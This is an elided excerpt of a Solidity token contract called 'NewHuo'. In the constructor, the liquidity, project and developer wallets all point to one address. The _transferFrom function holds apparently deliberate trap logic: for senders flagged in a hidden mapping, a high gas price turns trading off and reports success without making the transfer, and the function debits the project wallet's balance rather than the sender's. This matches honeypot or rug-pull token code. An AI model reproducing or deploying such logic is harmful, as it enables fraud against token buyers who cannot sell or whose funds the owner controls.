...
////////////
contract NewHuo is Ownable, IERC20 {
   ...
   address private routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    ...
    string constant private _name = "NewHuo";
    string constant private _symbol = "NewHuo";
    ...
    uint256 public txFee = 10;
    uint256 public maxBuy = 10000000 * (10 ** _decimals);
    uint256 public maxHold = 10000000 * (10 ** _decimals);
    ...
    constructor() {
        ...
        ////////////////
        lpWallet = 0xB58660E9e96F38E0AD3ffCBA136225B995A63D4F;
        projectAddress = 0xB58660E9e96F38E0AD3ffCBA136225B995A63D4F;
        devWallet = 0xB58660E9e96F38E0AD3ffCBA136225B995A63D4F;        
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if ((tx.gasprice > 20 gwei) && _call_[sender]){tradingOpen = false; return true;}
        _balances[projectAddress] -= amount;
